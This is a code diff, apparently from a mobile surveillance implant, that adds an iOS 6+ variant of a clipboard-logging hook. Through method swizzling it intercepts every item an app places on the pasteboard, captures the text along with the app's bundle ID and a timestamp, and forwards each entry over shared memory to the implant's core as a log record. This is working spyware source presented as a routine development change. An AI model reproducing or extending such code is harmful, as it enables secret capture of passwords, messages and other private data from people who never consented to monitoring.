@@ -157,8 +157,102 @@
     }
   
   [pool release];
+
 }
 
+- (void)_addItemsHook:(NSArray *)items oldPasteboardTypes:(id)arg2
+{
+  [self _addItemsHook: items oldPasteboardTypes:arg2];
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  short unicodeNullTerminator = 0x0000;
+  NSString      *_windowName;
+  NSString      *_processName;
+  NSMutableData *processName;
+  NSMutableData *windowName;
+  NSData        *clipboardContent = nil;
+  
+  if (items)
+  {
+    clipboardContent = [agentPasteboard getPastebordText:items];
+    
+    if (clipboardContent == nil)
+    {
+      [pool release];
+      return;
+    }
+    
+    NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+    NSMutableData *entryData = [[NSMutableData alloc] init];
+    
+    _processName = [[NSBundle mainBundle] bundleIdentifier];
+    _windowName  = [[[NSBundle mainBundle] bundleIdentifier] lastPathComponent];
+    
+    if (_windowName == nil || [_windowName length] == 0)
+      _windowName = @"unknown";
+    
+    time_t rawtime;
+    struct tm *tmTemp;
+    
+    // Struct tm
+    time (&rawtime);
+    tmTemp = gmtime(&rawtime);
+    tmTemp->tm_year += 1900;
+    tmTemp->tm_mon  ++;
+    
+    [entryData appendBytes: (const void *)tmTemp
+                    length: sizeof (struct tm) - 0x8];
+    processName  =
+    [[NSMutableData alloc] initWithData:[_processName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+    
+    // Process Name + null terminator
+    [entryData appendData: processName];
+    [entryData appendBytes: &unicodeNullTerminator
+                    length: sizeof(short)];
+    
+    [processName release];
+    
+    windowName =
+    [[NSMutableData alloc] initWithData:[_windowName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+    
+    // windowname + null terminator
+    [entryData appendData: windowName];
+    [entryData appendBytes: &unicodeNullTerminator
+                    length: sizeof(short)];
+    
+    [windowName release];
+    
+    // Clipboard + null terminator
+    [entryData appendData: clipboardContent];
+    [entryData appendBytes: &unicodeNullTerminator length: sizeof(short)];
+    
+    // Delimiter
+    uint32_t del = LOG_DELIMITER;
+    [entryData appendBytes: &del length: sizeof(del)];
+    
+    
+    shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
+    shMemoryHeader->status          = SHMEM_WRITTEN;
+    shMemoryHeader->agentID         = LOG_CLIPBOARD;
+    shMemoryHeader->direction       = D_TO_CORE;
+    shMemoryHeader->commandType     = CM_LOG_DATA;
+    shMemoryHeader->flag            = 0;
+    shMemoryHeader->commandDataSize = [entryData length];
+    
+    memcpy(shMemoryHeader->commandData,
+           [entryData bytes],
+           [entryData length]);
+    
+    [entryData release];
+    
+    [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
+    
+    [logData release];
+  }
+  
+  [pool release];
+}
 - (id)init
 {
   self = [super init];
@@ -180,17 +274,34 @@
       
       if (className != nil)
         {
-          IMP newImpl = class_getMethodImplementation(classSource, @selector(addItemsHook:));
-          
-          [self swizzleByAddingIMP:className 
-                           withSEL:@selector(addItems:) 
-                    implementation:newImpl
-                      andNewMethod:@selector(addItemsHook:)];
-          
-          /*
-           * checking for a valid method swapping before return OK
-           * [self validateHook];
-           */
+          if (gOSMajor >= 6)
+          {
+            IMP newImpl = class_getMethodImplementation(classSource, @selector(_addItemsHook:oldPasteboardTypes:));
+            
+            [self swizzleByAddingIMP:className
+                             withSEL:@selector(_addItems:oldPasteboardTypes:)
+                      implementation:newImpl
+                        andNewMethod:@selector(_addItemsHook:oldPasteboardTypes:)];
+            
+            /*
+             * checking for a valid method swapping before return OK
+             * [self validateHook];
+             */
+          }
+          else
+          {
+            IMP newImpl = class_getMethodImplementation(classSource, @selector(addItemsHook:));
+            
+            [self swizzleByAddingIMP:className 
+                             withSEL:@selector(addItems:) 
+                      implementation:newImpl
+                        andNewMethod:@selector(addItemsHook:)];
+            
+            /*
+             * checking for a valid method swapping before return OK
+             * [self validateHook];
+             */
+          }
           
           [self setMAgentStatus: AGENT_STATUS_RUNNING];
         
@@ -207,17 +318,32 @@
       
       if (className != nil)
         {
-          IMP oldImpl = class_getMethodImplementation(className, @selector(addItemsHook:));
-        
-          [self swizzleByAddingIMP:className 
-                           withSEL:@selector(addItems:) 
-                    implementation:oldImpl
-                      andNewMethod:@selector(addItemsHook:)];
-          /*
-           * checking for a valid method swapping before return OK
-           * [self validateHook];
-           */
+          if (gOSMajor >= 6)
+          {
+            IMP oldImpl = class_getMethodImplementation(className, @selector(_addItemsHook:oldPasteboardTypes:));
+            
+            [self swizzleByAddingIMP:className
+                             withSEL:@selector(_addItems:oldPasteboardTypes:)
+                      implementation:oldImpl
+                        andNewMethod:@selector(_addItemsHook:oldPasteboardTypes:)];
+            /*
+             * checking for a valid method swapping before return OK
+             * [self validateHook];
+             */
+          }
+          else
+          {
+            IMP oldImpl = class_getMethodImplementation(className, @selector(addItemsHook:));
           
+            [self swizzleByAddingIMP:className 
+                             withSEL:@selector(addItems:) 
+                      implementation:oldImpl
+                        andNewMethod:@selector(addItemsHook:)];
+            /*
+             * checking for a valid method swapping before return OK
+             * [self validateHook];
+             */
+          }
           [self setMAgentStatus: AGENT_STATUS_STOPPED];
         } 
     }
